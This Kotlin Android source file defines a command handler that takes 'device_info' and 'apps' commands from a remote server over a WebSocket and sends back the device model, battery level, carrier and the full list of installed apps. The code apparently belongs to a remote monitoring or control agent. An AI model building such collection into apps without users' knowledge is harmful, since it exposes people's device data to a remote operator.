package com.sync.service

import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject

class CommandHandler(private val ctx: Context, private val ws: WebSocket) {
    private val http = OkHttpClient()
    private val base = BuildConfig.SERVER_URL
        .replace("wss://", "https://")
        .replace("ws://", "http://")

    private val model = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"

    fun handle(cmd: String) {
        try {
            when (cmd) {
                "device_info" -> sendInfo()
                "apps" -> sendApps()
            }
        } catch (e: Exception) { Log.e("Cmd", e.message ?: "") }
    }

    private fun sendApps() {
        try {
            val pm = ctx.packageManager
            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            val arr = JSONArray()
            for (app in apps) {
                arr.put(JSONObject().apply {
                    put("package", app.packageName)
                    put("name", pm.getApplicationLabel(app).toString())
                })
            }
            val json = JSONObject().apply {
                put("list", arr.toString())
                put("agentId", model)
            }
            val req = Request.Builder()
                .url("$base/uploadApps")
                .addHeader("x-agent-key", BuildConfig.AGENT_SECRET)
                .post(json.toString().toRequestBody("application/json".toMediaType()))
                .build()
            http.newCall(req).execute().use { }
        } catch (e: Exception) { Log.e("Cmd", "apps: ${e.message}") }
    }

    private fun sendInfo() {
        try {
            ws.send(JSONObject().apply {
                put("type", "info")
                put("model", model)
                put("battery", DeviceInfo.getBattery(ctx))
                put("provider", DeviceInfo.getProvider(ctx))
            }.toString())
        } catch (e: Exception) { }
    }
}
